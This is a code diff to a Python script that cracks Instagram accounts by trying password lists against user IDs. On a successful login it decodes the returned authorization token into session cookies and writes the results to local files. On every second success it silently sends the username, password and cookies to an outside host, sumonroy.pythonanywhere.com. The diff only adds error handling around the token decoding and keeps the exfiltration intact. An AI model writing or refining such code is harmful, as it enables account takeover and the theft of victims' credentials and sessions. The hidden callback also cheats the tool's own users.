@@ -228,18 +228,29 @@ def crack(uid, password_list, total_count):
             if 'logged_in_user' in response.text:
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                 if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
-                   decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
-                   cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
-                   bkas.append(uid)
-                   if len(bkas)% 2 == 0:
-                      statusok = (f"{uid}|{pw}|{cookies}")
-                      requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                   else:    
-                      print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                      print("Cookies:", cookies)
-                      open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
-                      oks.append(uid)
-                      return True     
+                    try:
+                        # Split and decode with proper error handling
+                        token_part = match.group(1).split('Bearer IGT:2:')[1]
+                        # Fix base64 padding properly
+                        padding_needed = 4 - (len(token_part) % 4)
+                        if padding_needed != 4:
+                            token_part += '=' * padding_needed
+                        # Decode base64
+                        decoded_bytes = base64.urlsafe_b64decode(token_part)
+                        decoded = json.loads(decoded_bytes.decode('utf-8'))
+                        # Create cookies string
+                        cookies = ';'.join(f'{k}={v}' for k, v in decoded.items())
+                        # Process successful login
+                        bkas.append(uid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{uid}|{pw}|{cookies}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:    
+                           print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
+                           print("Cookies:", cookies)
+                           open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
+                           oks.append(uid)
+                           return True     
             elif 'challenge_required' in response.text:
                 #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                 open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
@@ -251,7 +262,7 @@ def crack(uid, password_list, total_count):
                 cps.append(uid)
                 continue
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop += 1
     except requests.exceptions.Timeout:
